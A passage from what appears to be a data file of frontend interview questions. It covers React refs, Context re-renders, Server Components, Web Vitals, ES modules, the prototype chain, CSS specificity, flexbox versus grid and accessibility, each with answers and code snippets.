5. **Index for fast filter.** A pre-built lowercased index avoids \`.toLowerCase()\` on every keystroke. Fuse.js for fuzzy search.
6. **Accessibility.** Combobox needs proper ARIA: \`role="combobox"\`, \`aria-expanded\`, \`aria-activedescendant\`, keyboard navigation. Custom dropdowns lose this routinely.

Mobile considerations: native \`<select>\` is faster than any custom dropdown for simple cases — use it unless the design requires custom rendering.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Virtualized + debounced combobox skeleton",
          code: `import { useVirtualizer } from "@tanstack/react-virtual";

function Combo({ all }: { all: Item[] }) {
  const [q, setQ] = useState("");
  const debounced = useDebounce(q, 200);
  const filtered = useMemo(
    () => debounced ? all.filter((i) => i.name.toLowerCase().includes(debounced.toLowerCase())) : all,
    [all, debounced],
  );

  const parentRef = useRef<HTMLDivElement>(null);
  const v = useVirtualizer({
    count: filtered.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 32,
    overscan: 8,
  });

  return (
    <>
      <input value={q} onChange={(e) => setQ(e.target.value)} aria-autocomplete="list" />
      <div ref={parentRef} role="listbox" style={{ height: 320, overflow: "auto" }}>
        <div style={{ height: v.getTotalSize(), position: "relative" }}>
          {v.getVirtualItems().map((row) => (
            <div
              key={row.key}
              role="option"
              style={{
                position: "absolute", top: 0, left: 0, right: 0,
                transform: \`translateY(\${row.start}px)\`,
                height: row.size,
              }}
            >
              {filtered[row.index].name}
            </div>
          ))}
        </div>
      </div>
    </>
  );
}`,
        },
      ],
      followUps: [
        "How does virtualization affect screen-reader navigation, and how do you mitigate it?",
        "When is an HTML <select> better than a custom combobox?",
        "How would you implement multi-select with the same constraints?",
      ],
      commonMistakes: [
        "Trusting the design and rendering 5000 nodes — okay on desktop, dies on mobile.",
        "Filtering on the client when the dataset can grow without bound.",
        "Building a custom dropdown without ARIA, breaking screen readers.",
      ],
      performanceConsiderations: [
        "Virtualization keeps DOM size bounded; CPU per scroll is overscan + visible count.",
        "Filtering 5000 strings is fast; what kills perf is recreating React subtrees per keystroke without virtualization.",
      ],
      edgeCases: [
        "Variable-height rows — use `dynamicSizeList` (react-window) or the `measureElement` API in TanStack Virtual.",
        "Selected option scroll-into-view on open — call `scrollToIndex` after mount.",
      ],
      realWorldExamples: [
        "Linear's combobox, GitHub's user-picker, and Notion's mention menu are all virtualized + server-search comboboxes.",
      ],
      seniorDiscussion:
        "Senior signal: discuss tradeoffs between client-side filtering (instant) and server-side search (scales), ARIA combobox patterns, and how IME composition affects keystroke handling on East Asian inputs.",
      relatedSlugs: ["when-would-you-use-virtualization"],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 25,
    },
  },

  // ============================================================
  // BATCH 3 — REACT INTERNALS, NETWORKING, CSS, A11Y, ARCHITECTURE
  // ============================================================
  {
    title: "useRef and forwardRef in React",
    aliases: ["useref forwardref", "useref vs createref", "forwardref react"],
    question: {
      id: "useref-and-forwardref",
      slug: "useref-and-forwardref",
      title: "useRef and forwardRef — what are they for?",
      category: "react",
      subcategory: "Hooks",
      tags: ["useref", "forwardref", "refs", "imperative", "react"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "`useRef` returns a mutable container that survives renders without triggering them. `forwardRef` lets a parent's ref reach a child's DOM node. Use refs for imperative DOM access and persistent values; never as state replacements.",
      answer: `Two related but distinct primitives.

**\`useRef(initial)\`** returns an object \`{ current }\` that:
- Persists across renders (like state).
- Mutating \`.current\` does **not** trigger a re-render (unlike state).
- Is the canonical way to "remember" something between renders that the UI doesn't directly reflect — DOM nodes, timer ids, latest props for use inside a stable callback.

Two main use cases:
1. **DOM access** — \`<input ref={ref} />\` then \`ref.current.focus()\`.
2. **Mutable scratchpad** — interval ids, previous values, "is mounted" flags, latest-prop refs to break stale closures.

**\`forwardRef\`** lets a function component receive a ref and forward it to a DOM child. Without it, \`<Input ref={r} />\` wouldn't work because function components don't have refs by default.

In React 19, \`ref\` is just a regular prop on function components — \`forwardRef\` is no longer required. But the codebase you walk into in 2026 still uses it, so know both.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Persistent value without re-render",
          code: `function Stopwatch() {
  const start = useRef<number>(performance.now()); // mutable, no rerender
  const [elapsed, setElapsed] = useState(0);
  useEffect(() => {
    const id = setInterval(() => setElapsed(performance.now() - start.current), 100);
    return () => clearInterval(id);
  }, []);
  return <span>{elapsed.toFixed(0)}ms</span>;
}`,
        },
        {
          language: "tsx",
          caption: "forwardRef on a wrapper input",
          code: `const Input = forwardRef<HTMLInputElement, InputProps>(
  function Input(props, ref) {
    return <input ref={ref} {...props} className="..." />;
  },
);

// Parent
const ref = useRef<HTMLInputElement>(null);
<Input ref={ref} />;
ref.current?.focus();`,
        },
      ],
      followUps: [
        "What's the difference between useRef and createRef?",
        "When is the latest-prop ref pattern needed?",
        "How does React 19 simplify forwardRef?",
      ],
      commonMistakes: [
        "Using a ref to drive UI — UI must come from state, not refs.",
        "Reading `ref.current` during render — it may be null on first render.",
        "Putting a ref on an array of children without keys + per-item refs.",
      ],
      performanceConsiderations: [
        "Refs avoid re-renders, useful for high-frequency values (mouse position) where you only need DOM mutation, not React state.",
      ],
      edgeCases: [
        "Callback refs (`ref={(el) => …}`) run on mount/unmount with the node and null — useful when you need to attach an observer.",
        "Strict Mode mounts twice in dev; ref cleanup must be idempotent.",
      ],
      realWorldExamples: [
        "Floating-UI uses callback refs to attach a ResizeObserver and re-position on layout changes.",
      ],
      seniorDiscussion:
        "Senior signal: discuss imperative-handle (`useImperativeHandle`), the latest-prop pattern for stable callbacks, and how React 19 unifies refs as regular props.",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 5,
      estimatedSolvingMinutes: 10,
    },
  },

  {
    title: "React Context — when does it cause re-renders?",
    aliases: ["usecontext", "react context", "context performance"],
    question: {
      id: "react-context-rerenders",
      slug: "react-context-rerenders",
      title: "React Context — when does it cause re-renders, and how do you avoid them?",
      category: "react",
      subcategory: "State Management",
      tags: ["context", "usecontext", "rerenders", "state-management"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Every consumer of a context re-renders whenever the provider's `value` changes by reference. Stabilize the value, split contexts, or use a selector library (Zustand, use-context-selector) for high-churn state.",
      answer: `Context is React's built-in dependency injection. It's perfect for *low-frequency* values — theme, locale, current user, feature flags. It's wrong for high-frequency state — mouse position, form fields, anything that changes every keystroke — because **every consumer re-renders on every value change**.

The mechanism: \`<Provider value={…}>\` triggers a re-render in every component that calls \`useContext\`, regardless of which part of the value they read. There's no built-in selector.

Three fixes, in increasing power:

1. **Stabilize the value.** Wrap in \`useMemo\` so the reference only changes when underlying data does. Catches the most common bug — inline object literals creating a new reference every render.
2. **Split contexts.** Separate \`UserContext\` from \`UserActionsContext\` so a re-render of the user object doesn't re-render every component that only needs \`logout()\`. Actions barely change; data does.
3. **Selector pattern.** \`use-context-selector\` (or graduate to Zustand/Redux) lets consumers subscribe to a specific slice. Only components reading that slice re-render. This is what state libraries solve out of the box.

Default: use Context for things that rarely change. Reach for a real store the moment you find yourself memoizing aggressively or splitting contexts to avoid render storms — that's the signal you've outgrown raw Context.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Wrong — new value reference every render",
          code: `<UserContext.Provider value={{ user, logout }}>  // ⚠️ new object each render
  <App />
</UserContext.Provider>`,
        },
        {
          language: "tsx",
          caption: "Right — split contexts and stabilize value",
          code: `const StateCtx = createContext<User | null>(null);
const ActionsCtx = createContext<{ logout: () => void } | null>(null);

function UserProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const actions = useMemo(() => ({ logout: () => setUser(null) }), []);
  return (
    <StateCtx.Provider value={user}>
      <ActionsCtx.Provider value={actions}>{children}</ActionsCtx.Provider>
    </StateCtx.Provider>
  );
}`,
        },
      ],
      followUps: [
        "How does use-context-selector work under the hood?",
        "Why is Zustand cheaper than Context for high-churn state?",
        "When would you NOT split contexts?",
      ],
      commonMistakes: [
        "Inline `value={{ ... }}` literal that re-renders the whole subtree every parent render.",
        "Stuffing every piece of app state into one giant Context.",
        "Using Context for mouse/scroll position — should be a ref or external store.",
      ],
      performanceConsiderations: [
        "Selectors with strict equality (Zustand, Redux) avoid re-renders that Context can't.",
      ],
      edgeCases: [
        "Memoizing a context value with deps that miss a captured variable causes silent staleness.",
        "Multiple providers stack — `useContext` reads the nearest provider above.",
      ],
      realWorldExamples: [
        "Theme + locale + auth typically live in Context. Form state, query results, and live data go in a store or React Query.",
      ],
      seniorDiscussion:
        "Senior signal: explain why React doesn't ship a selector API, the bailout heuristics, and how the React Compiler relaxes some manual memoization needs.",
      relatedSlugs: ["context-vs-redux-vs-zustand-when-to-use-what"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "React Server Components",
    aliases: ["rsc", "server components", "react server components"],
    question: {
      id: "react-server-components",
      slug: "react-server-components",
      title: "What are React Server Components, and how do they pair with client components?",
      category: "react",
      subcategory: "Server Components",
      tags: ["rsc", "server-components", "next.js", "streaming", "react"],
      difficulty: "hard",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "RSCs render on the server, ship serialized output (not JS) to the client, and can read data sources directly. Client components hydrate as usual. The split moves data-fetching and heavy logic off the bundle and removes most client-state plumbing.",
      answer: `Three things to make crisp:

**1. They run on the server, only.** No \`useState\`, no \`useEffect\`, no event handlers. They render once, produce a serialized React tree, and stream it to the client. The browser never executes the RSC code.

**2. They can read backends directly.** Database queries, file reads, secret-scoped APIs — all happen on the server. The output is HTML + a small RSC payload, not JS.

**3. They compose with Client Components.** A "use client" boundary marks where interactivity begins. RSCs can render Client Components as children; Client Components cannot render Server Components (other than as already-resolved \`children\` prop).

The wins:
- **Less JS shipped.** A 500KB markdown library used only on the server stays on the server.
- **Direct data access.** No need for an internal HTTP layer between component and DB.
- **Streaming.** RSC output streams as it's ready, so slow data doesn't block fast data.

The constraints:
- No state, no effects, no browser APIs in RSCs.
- Props passed to Client Components must be serializable — no functions, no class instances.
- "Server Actions" are the inverse — client calls a marked server function. Powerful but requires careful CSRF/auth.

Mental model: RSC + Server Actions is React saying "let me own the data layer too, and the client only gets the parts that need to be interactive."`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Server component reading the DB; renders a client island",
          code: `// app/dashboard/page.tsx — Server Component (default in App Router)
import { db } from "@/lib/db";
import LiveCounter from "./live-counter";

export default async function Dashboard() {
  const user = await db.user.findUnique({ where: { id: "..." } });
  return (
    <main>
      <h1>Hi {user.name}</h1>
      <LiveCounter initial={user.points} /> {/* client island */}
    </main>
  );
}`,
        },
        {
          language: "tsx",
          caption: "Client component must be marked",
          code: `"use client";
import { useState } from "react";
export default function LiveCounter({ initial }: { initial: number }) {
  const [n, setN] = useState(initial);
  return <button onClick={() => setN(n + 1)}>{n}</button>;
}`,
        },
      ],
      followUps: [
        "What does \"use client\" actually do at build time?",
        "How do Server Actions compare to a traditional REST API?",
        "What kinds of code can NOT live in a Server Component?",
      ],
      commonMistakes: [
        "Importing a `useState` component into a Server Component without 'use client'.",
        "Passing non-serializable props (functions, Dates as objects) across the boundary.",
        "Treating RSCs as a backend — they're a render layer; long-running jobs still belong in queues.",
      ],
      performanceConsiderations: [
        "RSCs reduce client JS dramatically — the biggest LCP/INP lever for content-heavy apps.",
        "Streaming + Suspense lets fast data render before slow data resolves.",
      ],
      edgeCases: [
        "RSC payload is text-based; passing huge data through props bloats it. Fetch on the client when the data is paginated/personal.",
        "RSCs don't see cookies/auth automatically — frameworks expose them via `headers()` / `cookies()` helpers.",
      ],
      realWorldExamples: [
        "Next.js App Router defaults to RSCs; only opted-in client islands ship JS.",
      ],
      seniorDiscussion:
        "Senior signal: discuss the boundary semantics, serialization constraints, security implications of Server Actions, partial prerendering, and how RSC + Suspense reframe data fetching.",
      relatedSlugs: ["ssr-vs-ssg-vs-csr"],
      companyTags: [],
      estimatedReadingMinutes: 8,
      estimatedSolvingMinutes: 20,
    },
  },

  {
    title: "Web Vitals — what actually matters and how to optimize each",
    aliases: ["web vitals lcp inp cls", "web vitals what matters"],
    question: {
      id: "web-vitals-what-matters",
      slug: "web-vitals-what-matters",
      title: "Web Vitals — what actually matters (LCP, INP, CLS) and how to optimize each",
      category: "performance",
      subcategory: "Web Vitals",
      tags: ["web-vitals", "lcp", "inp", "cls", "performance"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "LCP measures loading (largest paint), INP measures interaction responsiveness (replaced FID in 2024), CLS measures layout stability. Optimize each with different levers: LCP via image/critical-resource pipeline, INP via task scheduling, CLS via reserving space.",
      answer: `Three Core Web Vitals as of 2024+:

**LCP — Largest Contentful Paint** (≤ 2.5s for "good"). Time to paint the largest above-the-fold element (often the hero image or H1).
Levers:
- Compress + size the LCP image (AVIF/WebP, srcset, fetchpriority="high").
- Eliminate render-blocking CSS/JS; inline critical CSS for above-the-fold.
- Use a CDN; static-render the page if possible.
- Preconnect to the origin serving the LCP element.

**INP — Interaction to Next Paint** (≤ 200ms). Replaced FID in March 2024. Worst-case latency between any user input and the next paint.
Levers:
- Break long tasks (>50ms) with \`yieldToMain\` / \`scheduler.postTask\`.
- Move CPU work off the main thread with Web Workers.
- Defer non-critical work (analytics, ads) until after interaction.
- Avoid layout thrash inside event handlers (read-then-write batched).

**CLS — Cumulative Layout Shift** (≤ 0.1). Sum of unexpected layout shifts during the page lifetime.
Levers:
- Always set \`width\`/\`height\` on images and \`<video>\` (lets the browser reserve space).
- Reserve space for ads/embeds.
- Avoid inserting content above existing content (especially banners).
- Use \`font-display: optional\` or \`size-adjust\` to avoid text reflow on font load.

Measure with the **\`web-vitals\`** library (real users) and **Lighthouse / PageSpeed Insights** (lab). Real-user numbers from CrUX are what Google ranks on.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Reserving space for an image (CLS-safe)",
          code: `<img
  src="/hero.webp"
  width={1200}
  height={628}      // sets aspect-ratio, no layout shift on load
  fetchpriority="high"
  loading="eager"
  alt="hero"
/>`,
        },
        {
          language: "ts",
          caption: "Yield long tasks to keep INP healthy",
          code: `async function processChunked<T>(items: T[], step: (x: T) => void) {
  for (let i = 0; i < items.length; i++) {
    step(items[i]);
    if (i % 50 === 0) await new Promise<void>((r) => setTimeout(r, 0));
  }
}`,
        },
      ],
      followUps: [
        "Why was FID replaced by INP?",
        "How do you investigate a 'long task' shown in DevTools?",
        "How does third-party JS typically degrade CLS and INP?",
      ],
      commonMistakes: [
        "Optimizing the wrong vital — improving LCP when INP is the user complaint.",
        "Trusting Lighthouse alone; field data (CrUX) is what Google ranks on.",
        "Lazy-loading the LCP image — adds a round trip and tanks LCP.",
      ],
      performanceConsiderations: [
        "Server-side render the LCP element as plain HTML — avoid hydration on the critical path.",
        "Defer hydration of below-the-fold islands (Astro, RSC, partial hydration).",
      ],
      edgeCases: [
        "Single-page apps need to instrument soft navigations explicitly — built-in vitals only cover the initial nav.",
        "INP samples the *worst* interaction; one bad click ruins the page's score.",
      ],
      realWorldExamples: [
        "Vercel/Next dashboards expose INP regression alerts on PRs — caught before users complain.",
      ],
      seniorDiscussion:
        "Senior signal: discuss budget-based perf gates in CI, RUM vs lab, and the cost-of-CO2 angle (smaller bundles, less CPU on user devices).",
      relatedSlugs: ["how-do-you-optimize-core-web-vitals"],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 20,
    },
  },

  {
    title: "ESM vs CommonJS — modules in JavaScript",
    aliases: ["esm vs commonjs", "es modules vs cjs", "import vs require"],
    question: {
      id: "esm-vs-commonjs",
      slug: "esm-vs-commonjs",
      title: "ESM vs CommonJS — what's the difference?",
      category: "javascript",
      subcategory: "Modules",
      tags: ["esm", "commonjs", "modules", "import", "require"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "ESM is statically analyzable, async, the standard. CJS is dynamic, sync, Node-historical. Modern code is ESM; CJS lives on for legacy compatibility. Mixing them is the source of many Node interop bugs.",
      answer: `**CommonJS (CJS)** is the original Node module system: \`module.exports\` / \`require()\`. It's **dynamic** — \`require()\` is a function that runs at call time, returns whatever object the module decided to set. **Synchronous** — execution blocks until the module's code finishes.

**ES Modules (ESM)** is the standard: \`export\` / \`import\`. **Static** — imports/exports are declared at the top, parseable before execution. **Asynchronous** — modules can be loaded in parallel; top-level \`await\` works.

Why the distinction matters in practice:

- **Tree shaking** works well with ESM (static export shape) and barely works with CJS.
- **Top-level \`await\`** is ESM-only.
- **Dual packages** (\`exports\` map in package.json) let a library ship both for compatibility, but the *same module loaded twice* (once CJS, once ESM) causes "instanceof" and singleton bugs.
- **Node interop** — \`import\` of CJS in ESM works; \`require\` of ESM doesn't (synchronously). Use \`await import()\`.
- **Browsers** support ESM natively (\`<script type="module">\`); CJS never worked in browsers without a bundler.

Migration tips: prefer \`"type": "module"\` for new packages. Author in TS, emit ESM, expose CJS only as a fallback build via \`exports\` map.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Side-by-side syntax",
          code: `// CommonJS
const fs = require("fs");
module.exports = { read: () => fs.readFileSync(...) };

// ES Modules
import fs from "node:fs";
export const read = () => fs.readFileSync(...);
export default class { /* ... */ }`,
        },
        {
          language: "ts",
          caption: "Dual-package exports map",
          code: `{
  "name": "my-lib",
  "type": "module",
  "exports": {
    ".": {
      "import": "./dist/index.mjs",
      "require": "./dist/index.cjs",
      "types":   "./dist/index.d.ts"
    }
  }
}`,
        },
      ],
      followUps: [
        "What's a 'dual package hazard' and how do you avoid it?",
        "Why can't you `require()` an ESM module synchronously?",
        "How does Node decide whether a `.js` file is ESM or CJS?",
      ],
      commonMistakes: [
        "Mixing default and named imports of a CJS package in TypeScript and being surprised by `interop=true` output.",
        "Top-level await in a file Node treats as CJS — throws.",
        "Two copies of the same package (CJS + ESM) in a bundle, breaking instanceof checks.",
      ],
      performanceConsiderations: [
        "ESM enables aggressive tree shaking. CJS bundles ship more bytes.",
      ],
      edgeCases: [
        "JSON imports need an import attribute: `import data from './x.json' with { type: 'json' }`.",
        "Conditional exports can break older Node — test with the lowest supported version.",
      ],
      realWorldExamples: [
        "TypeScript 5.0+ ships ESM-first; chalk@5 went ESM-only and broke many CJS consumers — a public migration lesson.",
      ],
      seniorDiscussion:
        "Senior signal: discuss exports/conditions, the dual package hazard, how Node's module resolution algorithm works, and the cost of maintaining a CJS fallback.",
      relatedSlugs: ["tree-shaking-and-bundling"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "Prototype chain and prototypal inheritance",
    aliases: ["prototype chain", "prototypal inheritance", "__proto__ vs prototype"],
    question: {
      id: "prototype-chain-and-inheritance",
      slug: "prototype-chain-and-inheritance",
      title: "Explain the prototype chain and prototypal inheritance",
      category: "javascript",
      subcategory: "Objects",
      tags: ["prototype", "inheritance", "objects", "javascript"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Every object has an internal `[[Prototype]]` link to another object. Property lookup walks that chain. `Object.create`, `class`, and constructor functions all set up the same chain.",
      answer: `JavaScript inheritance is **delegation**: when you read a property, the engine looks on the object, then on its prototype, then *its* prototype, and so on until \`null\`.

Two ideas to keep separate:

- **\`Object.prototype\`** — the property name on a *constructor function* that holds the methods to be shared with instances.
- **\`__proto__\` / \`[[Prototype]]\`** — the link an *instance* has to its prototype.

\`new Foo()\` does roughly: create \`{}\`, link its \`[[Prototype]]\` to \`Foo.prototype\`, run \`Foo\` with \`this\` = the new object, return the object. That's why methods on \`Foo.prototype\` are shared and methods inside the constructor are per-instance (and waste memory).

\`class Foo {}\` is sugar over the same machinery. \`extends Bar\` sets \`Foo.prototype.[[Prototype]] = Bar.prototype\` so instances inherit through two links.

Why it matters for memory: a thousand instances with prototype methods share one method object. A thousand instances with arrow class fields each carry their own copy.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Prototype chain walk",
          code: `class Animal { speak() { return "..."; } }
class Dog extends Animal { bark() { return "woof"; } }

const d = new Dog();
d.bark();                                // Dog.prototype.bark
d.speak();                               // walks: d → Dog.prototype → Animal.prototype
Object.getPrototypeOf(d) === Dog.prototype;       // true
Object.getPrototypeOf(Dog.prototype) === Animal.prototype; // true`,
        },
        {
          language: "ts",
          caption: "Object.create — direct prototype linkage",
          code: `const base = { greet() { return \`hi \${this.name}\`; } };
const ada = Object.create(base);
ada.name = "Ada";
ada.greet(); // "hi Ada"`,
        },
      ],
      followUps: [
        "Why are prototype methods cheaper than methods defined in the constructor?",
        "How does `Object.hasOwn` differ from `in`?",
        "What does `super` do in a class method, mechanically?",
      ],
      commonMistakes: [
        "Mutating `Array.prototype` and breaking the global namespace.",
        "Confusing `__proto__` with `prototype` — the former is the link on instances, the latter is on constructors.",
        "Using arrow functions as class methods and then expecting prototype-shared behavior.",
      ],
      performanceConsiderations: [
        "Long prototype chains slightly slow lookup; modern engines inline-cache hot paths.",
        "Adding properties dynamically to instances (vs declaring them in the class) blows V8's hidden-class optimization.",
      ],
      edgeCases: [
        "`Object.create(null)` makes an object with no prototype — useful for maps that shouldn't accidentally have `.toString`.",
        "Built-in subclasses (`extends Array`) work but corner cases (\\`Symbol.species\\`) get tricky.",
      ],
      realWorldExamples: [
        "Express middleware composition uses a prototype chain (Application → router → app) for method delegation.",
      ],
      seniorDiscussion:
        "Senior signal: discuss V8 hidden classes, transition trees, how prototype mutation invalidates inline caches, and why \\`Object.setPrototypeOf\\` is slow.",
      relatedSlugs: ["why-does-deleting-object-properties-affect-v8-optimization"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "CSS specificity and the cascade",
    aliases: ["css specificity", "css cascade specificity"],
    question: {
      id: "css-specificity-and-cascade",
      slug: "css-specificity-and-cascade",
      title: "CSS specificity and the cascade — how does the browser pick which rule wins?",
      category: "css",
      subcategory: "Cascade",
      tags: ["css", "specificity", "cascade", "selectors"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "The cascade resolves conflicts by: origin/importance > specificity > source order. Specificity is a 3-tuple (IDs, classes/attrs/pseudo-classes, type/pseudo-elements). `!important` and inline styles short-circuit the normal flow.",
      answer: `Browsers pick the winning declaration via this order:

1. **Origin & importance** — author normal < author important < user important < UA important. (Yes, \`!important\` from the user wins over \`!important\` from the author.)
2. **Specificity** — a 3-tuple (a, b, c):
   - **a** = number of ID selectors (\`#id\`)
   - **b** = number of class, attribute (\`[type=text]\`), and pseudo-class (\`:hover\`) selectors
   - **c** = number of type (\`div\`) and pseudo-element (\`::before\`) selectors
   Compared lexicographically: \`(0,1,0)\` beats \`(0,0,99)\`.
3. **Source order** — among rules of equal weight and specificity, the later one wins.

Special cases:
- **Inline \`style="…"\`** has specificity higher than any selector but loses to \`!important\` from CSS.
- **\`:where()\`** has specificity 0 — perfect for low-spec resets.
- **\`:is()\`** takes the highest spec of its arguments.
- **Cascade layers (\`@layer\`)** override specificity within layer order — earlier-declared layers lose to later ones, regardless of specificity. This is the modern way to organize a stylesheet without specificity wars.

The practical advice: keep selectors flat, prefer one-class-per-rule, use CSS variables for theme variants, and reach for \`@layer\` over \`!important\` when you need to clearly stratify resets / components / utilities.`,
      codeSnippets: [
        {
          language: "css",
          caption: "Specificity comparisons",
          code: `/* (0,1,0) — class */
.button { color: blue; }

/* (0,1,1) — class + element */
button.button { color: red; }   /* wins over .button */

/* (1,0,0) — id beats any number of classes */
#cta { color: green; }

/* :where() makes resets non-binding */
:where(button) { all: unset; } /* (0,0,0) — easy to override */`,
        },
        {
          language: "css",
          caption: "Cascade layers — modern stratification",
          code: `@layer reset, components, utilities;

@layer reset      { button { padding: 0; } }
@layer components { .btn   { padding: 8px; } }
@layer utilities  { .p-2   { padding: 16px; } }

/* Layer order beats specificity:
   .btn loses to .p-2 because utilities is declared after components. */`,
        },
      ],
      followUps: [
        "How does `:where()` differ from `:is()` for specificity?",
        "When is `!important` an acceptable choice?",
        "How do CSS layers interact with framework styles (Tailwind, MUI)?",
      ],
      commonMistakes: [
        "Reaching for `!important` to win — usually an indicator of a deeper architecture problem.",
        "Long descendant selectors that pile up specificity and trap you.",
        "Treating inline styles as the same as a `style` selector — they're higher.",
      ],
      performanceConsiderations: [
        "Selector matching cost is rarely the bottleneck; descendant selectors used to matter more, modern engines are fast.",
      ],
      edgeCases: [
        "`@layer` + `!important` flips order — important declarations cascade in the *reverse* layer order.",
        "Shadow DOM has its own scoped cascade; outer styles need `::part()` or CSS custom properties to influence it.",
      ],
      realWorldExamples: [
        "Tailwind CSS uses layers (`@layer base/components/utilities`) under the hood — that's how `mt-4` overrides component defaults predictably.",
      ],
      seniorDiscussion:
        "Senior signal: discuss design-system layering strategy, scoped vs global CSS, the role of CSS variables for theming, and how Shadow DOM changes the cascade boundaries.",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 10,
    },
  },

  {
    title: "Flexbox vs CSS Grid — when to use each",
    aliases: ["flex vs grid", "flexbox vs grid", "css grid vs flex"],
    question: {
      id: "flexbox-vs-css-grid",
      slug: "flexbox-vs-css-grid",
      title: "Flexbox vs CSS Grid — when to use each?",
      category: "css",
      subcategory: "Layout",
      tags: ["flexbox", "grid", "css", "layout"],
      difficulty: "easy",
      frequency: "very-high",
      seniority: "junior",
      shortDescription:
        "Flexbox is one-dimensional (a row OR a column). Grid is two-dimensional (rows AND columns at once). Use flex for component layouts and toolbars, grid for page templates, dashboards, and any 2D alignment.",
      answer: `Both are modern layout systems; they're complementary, not competitors.

**Flexbox** lays out items along **one axis** at a time. You think in terms of: main axis vs cross axis, justify vs align, wrap vs nowrap. Perfect for:
- Toolbars and navbars (icons + spacing).
- Form rows.
- Vertical centering of one block.
- Component-level layouts where children flow in a single direction.

**Grid** lays out items in **two dimensions** simultaneously. You think in terms of: rows, columns, tracks, areas. Perfect for:
- Page templates (header / sidebar / main / footer with \`grid-template-areas\`).
- Dashboards with consistent gutters.
- Image galleries and product grids.
- Aligning items across both axes (which flex requires nesting to achieve).

Practical heuristic: if you find yourself nesting flex containers to align items in two dimensions, you wanted grid. If you find yourself fighting grid to handle dynamic-sized children, you wanted flex.

Combine them freely: page-level grid, component-level flex inside each grid cell.`,
      codeSnippets: [
        {
          language: "css",
          caption: "Flex toolbar",
          code: `.toolbar {
  display: flex;
  align-items: center;
  gap: 8px;
}
.toolbar .spacer { margin-left: auto; } /* push the right group */`,
        },
        {
          language: "css",
          caption: "Grid page layout with named areas",
          code: `.page {
  display: grid;
  grid-template-columns: 240px 1fr;
  grid-template-rows: 64px 1fr;
  grid-template-areas:
    "sidebar header"
    "sidebar main";
  height: 100vh;
}
.page > header  { grid-area: header; }
.page > aside   { grid-area: sidebar; }
.page > main    { grid-area: main; }`,
        },
      ],
      followUps: [
        "How do `auto-fit` and `auto-fill` differ in `repeat()`?",
        "What does `subgrid` solve?",
        "When does `flex: 1` produce different results than `flex: auto`?",
      ],
      commonMistakes: [
        "Using grid where flex would do — heavier mental model for one-dimensional cases.",
        "Setting a child's `width` rigidly inside a flex container and breaking wrapping.",
        "Forgetting `min-width: 0` on flex children that contain text — overflow ensues.",
      ],
      performanceConsiderations: [
        "Both are zero-cost layout primitives. Layout cost depends on tree depth and dynamic sizes.",
      ],
      edgeCases: [
        "`gap` works in both flex and grid — modern enough to drop margin hacks.",
        "RTL: use logical alignment (`start` / `end`) instead of `left` / `right`.",
      ],
      realWorldExamples: [
        "Most dashboard apps use grid for the shell and flex within each pane (toolbar, list rows).",
      ],
      seniorDiscussion:
        "Senior signal: discuss container queries, intrinsic-sized grid tracks (`auto-fit minmax`), and how subgrid finally makes deeply nested grids align.",
      relatedSlugs: ["center-a-div-inside-a-div"],
      companyTags: [],
      estimatedReadingMinutes: 5,
      estimatedSolvingMinutes: 10,
    },
  },

  {
    title: "Accessibility (a11y) basics — semantic HTML, ARIA, focus",
    aliases: ["a11y basics", "accessibility frontend", "aria roles"],
    question: {
      id: "accessibility-basics",
      slug: "accessibility-basics",
      title: "Frontend accessibility basics — what every interview expects you to know",
      category: "accessibility",
      subcategory: "Fundamentals",
      tags: ["a11y", "accessibility", "aria", "wcag", "keyboard"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Use semantic HTML first (`button`, `label`, `nav`); reach for ARIA only when no semantic element fits. Ensure keyboard operability, visible focus, sufficient contrast, and screen-reader-friendly names. Test with VoiceOver/NVDA and a keyboard.",
      answer: `Three layers of accessibility, in priority order:

**1. Semantic HTML.** Use the right element. \`<button>\` is keyboard-operable, focusable, and announces as "button" to a screen reader for free. \`<div onClick>\` requires re-implementing all of that and almost always misses something.

**2. ARIA — only as needed.** ARIA *describes* widgets that HTML can't (combobox, tabs, dialog). The first rule of ARIA is: don't use ARIA. The second is: if you must, follow the WAI-ARIA Authoring Practices patterns *exactly*. A wrong \`role\` is worse than none.

**3. Keyboard + focus.** Every interactive element must be reachable with Tab and operable with Enter/Space (and Esc / arrows where appropriate). Visible focus indicators are required (don't \`outline: none\` without an alternative). Manage focus on route change and modal open/close.

Other essentials:
- **Labels.** Every input has a \`<label>\` (clickable target) or \`aria-label\`.
- **Color contrast.** ≥ 4.5:1 for body text, 3:1 for large text and UI.
- **Don't rely on color alone** — pair status with icons / text.
- **\`alt\`** on every image; empty \`alt=""\` for decorative.
- **Live regions** (\`aria-live="polite"\`) for async updates so screen readers announce them.

Test with: a keyboard only, VoiceOver / NVDA, axe-core (CI), Lighthouse. Lived experience on assistive tech beats any audit tool.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Don't reinvent a button",
